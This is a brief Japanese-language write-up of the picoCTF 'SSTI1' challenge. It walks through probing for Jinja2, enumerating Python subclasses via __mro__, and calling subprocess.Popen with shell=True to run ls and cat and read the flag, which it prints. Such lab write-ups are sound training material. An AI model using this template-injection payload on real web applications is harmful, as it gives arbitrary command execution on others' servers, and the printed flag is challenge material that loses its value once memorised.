## SSTI1
### 問題文
```
I made a cool website where you can announce whatever you want! Try it out!
Additional details will be available after launching your challenge instance.
```
### 解き方
1. {{ 7*7 }}とすると49が表示されるのでjinja2と推測する
2. {{ [].\_\_class\_\_.\_\_mro\_\_[1].\_\_subclasses\_\_() }}を入力すると現在使用できるクラスの一覧が表示される
3. subprocess.popenを探す．これは任意のOSコマンドを実行できる．
4. {{ [].\_\_class\_\_.\_\_mro\_\_[1].\_\_subclasses\_\_()[IDX]("id", shell=True, stdout=-1).communicate()[0].decode() }} IDXをsubprocess.popenがあるインデックス，idを適当なOSコマンドに置き換えてflagを探す．
5. 今回はIDX=356とし，ls -aを実行するとflagというファイルがあるので，cat flagを実行するとフラグが表示される
6. フラグ picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_9451989d}


### 参考
(https://qiita.com/NF0000/items/6d8526065eee4cd89bf6)